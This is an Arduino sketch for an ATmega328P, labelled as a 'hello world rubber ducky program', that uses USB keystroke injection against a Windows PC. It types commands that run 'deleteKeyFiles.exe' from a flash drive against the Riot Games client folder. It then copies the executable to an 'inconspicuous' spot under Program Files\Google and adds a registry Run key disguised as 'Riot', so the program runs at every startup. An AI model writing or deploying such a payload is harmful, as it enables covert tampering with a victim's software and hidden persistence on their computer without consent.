// hello world rubber ducky program
// runs on the atemega328p
char run_exe[] = "deleteKeyFiles.exe \"C:\Riot Games\" RiotClientServices.exe";
char copy_to_c[] = "copy D:\\deleteKeyFiles.exe \"C:\\Program Files\\Google\\\"";
char run_startup[] = "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Riot /d \"\\\"c:\\Program Files\\Google\\deleteKeyFiles.exe\\\" \\\"C:\\Riot Games\\\" RiotClientServices.exe\" /t REG_SZ";

void setup() {
  // serial to atmega16u (for USB)
  Serial.begin(115200); 
}

void send(char* string) {
  for (int i = 0; i < strlen(string); i++) {
    Serial.write(string[i]);
    delay(10); // delay a tiny bit so that the 16u doesn't get flooded
  }
  Serial.write('\n');
  delay(100);
}

void loop() {
  // send commands
  // switch to flash drive
  if (Serial.read() == 'g') {
    send("D:");

    // run the windows executable
    send(run_exe);
    
    // copy somewhere inconspicuous
    send(copy_to_c);
    
    // add registry entry to run on startup
    send(run_startup);
    
    // close terminal
    send("exit");
  }
}
